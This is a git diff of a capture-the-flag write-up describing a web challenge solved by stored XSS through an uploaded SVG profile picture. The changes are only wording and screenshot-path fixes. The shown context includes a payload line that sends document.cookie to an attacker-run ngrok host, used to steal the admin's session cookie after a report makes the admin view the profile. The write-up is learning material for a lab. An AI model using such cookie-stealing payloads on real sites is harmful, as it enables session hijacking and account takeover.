@@ -5,15 +5,14 @@
 > Description : You need to get logged in as admin to complete this challenge.
 
 On visiting the challenge link,it shows normal login and register page.Created the user account and get logged in as normal user.
-In the profile page
 
-![Screenshot](/sreenshot1.png "Screenshot")
+![Screenshot](/screenshots/sreenshot1.png "Screenshot")
 
 It has the image uploading functionality and i tried to popup the XSS using SVG
 
 > Scalable Vector Graphics(SVG) is an XML-based vector image format for two-dimensional graphics with support for interactivity and animation.
 
-It was common payload used for fire the XSS using SVG,Here is the payload!!
+I have the common payload used for fire the XSS using SVG,Here is the payload!!
 ```
 
 <?xml version="1.0" standalone="no"?>
@@ -31,9 +30,9 @@ It was common payload used for fire the XSS using SVG,Here is the payload!!
 Here,the website having another functionality which was report the user.If i report any user admin will look into that user profile.
 So,What i done was,
 
-Open the terminal and start python http server and open another tab and start the ngrok with the port which is used for python http server
+Open the terminal and started python http server and open another tab and started  ngrok with the port which is used for python http server
 
-![Screenshot](/screensho2.png "Screenshot")
+![Screenshot](/screenshots/screensho2.png "Screenshot")
 
 Alter the payload like this, 
 
@@ -53,7 +52,7 @@ i.src="http://8eb8-59-98-37-253.ngrok.io/?"+document.cookie;
 And upload it as the profile picture,after that copy the userid and report it to the admin.
 And the ADMIN cookie stealed!!
 
-![Screenshot](/admincookie.png "Screenshot")
+![Screenshot](/screenshots/admincookie.png "Screenshot")
 
 Change auth cookie to this admin cookie, We found the FLAG !!
 
